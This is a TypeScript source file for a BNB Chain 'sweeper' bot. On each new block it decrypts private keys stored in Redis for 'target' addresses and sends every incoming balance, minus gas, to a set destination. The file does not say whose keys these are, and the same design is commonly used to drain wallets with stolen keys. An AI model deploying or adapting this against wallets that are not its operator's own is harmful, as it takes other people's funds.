import { createPublicClient, createWalletClient, webSocket, http, fallback, formatEther } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc } from 'viem/chains'; // Configured for BNB Smart Chain
import * as dotenv from 'dotenv';
import { redis } from '../config/db';
import { decryptKey } from './encryption';

dotenv.config();

const rawWssUrls = process.env.WSS_URLS;
if (!rawWssUrls) throw new Error("Missing WSS_URLS environment variable");

const wssUrls = rawWssUrls.split(',').map(url => url.trim());
const httpUrls = wssUrls.map(url => url.replace('wss://', 'https://'));

const wssTransports = wssUrls.map(url => webSocket(url));
const httpTransports = httpUrls.map(url => http(url));

const publicClient = createPublicClient({
    chain: bsc,
    transport: fallback(wssTransports)
});

const broadcastClient = createWalletClient({
    chain: bsc,
    transport: fallback(httpTransports)
});

export const startSweeperEngine = async () => {
    console.log(`⚡️ Execution Engine Online on BNB Chain: Watching with ${wssUrls.length} RPC providers...`);

    publicClient.watchBlocks({
        onBlock: async (block) => {
            try {
                const keys = await redis.keys('target:*');
                if (keys.length === 0) return;

                await Promise.all(keys.map(async (redisKey) => {
                    const targetAddress = redisKey.split(':')[1] as `0x${string}`;
                    
                    const balance = await publicClient.getBalance({ address: targetAddress });
                    if (balance === 0n) return;

                    const targetData = await redis.hgetall(redisKey);
                    if (!targetData || !targetData.encryptedKey) return;

                    const privateKey = decryptKey(targetData.encryptedKey) as `0x${string}`;
                    const account = privateKeyToAccount(privateKey);
                    const destination = targetData.destination as `0x${string}`;

                    const gasPrice = await publicClient.getGasPrice();
                    const gasLimit = 21000n;
                    const txFee = gasPrice * gasLimit;

                    if (balance <= txFee) return;

                    const sweepAmount = balance - txFee;

                    const txHash = await broadcastClient.sendTransaction({
                        account,
                        to: destination,
                        value: sweepAmount,
                        gas: gasLimit,
                        gasPrice: gasPrice,
                    });

                    console.log(`✅ SWEPT! Sent ${formatEther(sweepAmount)} BNB to ${destination}. TX: ${txHash}`);
                }));
            } catch (error) {
                console.error("[Engine Error] Block processing failed:", error);
            }
        }
    });
};
